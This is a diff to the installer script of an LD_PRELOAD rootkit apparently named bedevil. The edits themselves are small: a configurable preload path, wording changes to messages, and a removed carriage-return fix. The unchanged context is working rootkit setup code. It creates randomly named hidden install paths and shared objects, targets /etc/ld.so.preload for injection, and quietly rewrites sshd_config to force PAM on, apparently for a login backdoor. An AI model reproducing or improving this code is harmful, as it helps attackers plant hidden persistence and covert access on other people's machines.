@@ -5,7 +5,7 @@
 MGID=$RANDOM
 IDIR="/lib/bedevil.$RANDOM"
 BD_ENV="`cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 8 | head -n 1`"
-LDSO_PRELOAD="/etc/ld.so.preload"
+[ -z $LDSO_PRELOAD ] && LDSO_PRELOAD="/etc/ld.so.preload"
 
 BDVLC="bdvl.c"
 BDVLSO="`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n1`.so" # shared object to create
@@ -27,7 +27,7 @@ secho() { printf " \e[32m[+]\e[0m $1\n"; }
 necho() { printf " [..] $1\n"; }
 
 [ $(id -u) != 0 ] && { eecho "You do not have root privileges. Your actions are limited."; NOT_ROOT=1; }
-[ ! -e /proc ] && { eecho "/proc doesn't exist, exiting. May I suggest bailing from this box?"; exit; }
+[ ! -e /proc ] && { eecho "/proc doesn't exist, exiting. May I suggest bailing?"; exit; }
 [ "$(cat /etc/ssh/sshd_config | grep 'UsePAM')" == "UsePAM yes" ] || echo "UsePAM yes" >> /etc/ssh/sshd_config
 
 if [ -f /etc/syslinux/config ]; then
@@ -43,7 +43,7 @@ if [ -f /etc/syslinux/config ]; then
 fi
 
 HELPMSG="
-Usage: $0 [ -h | -v | -d | -f | -D | -c | -C | -i]
+Usage: $0 [ -h | -v | -d | -f | -D | -c | -C | -i ]
         -h: Show this help message and exit.
         -v: Toggle verbose output.
         -d: Populate rootkit headers with user data.
@@ -150,7 +150,6 @@ writechrs()
 # see 'modules/stconsts'
 writesconsts()
 {
-    sed -i 's/\r$//g' $NEW_MDIR/stconsts # lol windows
     local stconsts="`cat $NEW_MDIR/stconsts | grep -o '^[^#]*'`"
     local cconsts=""
 
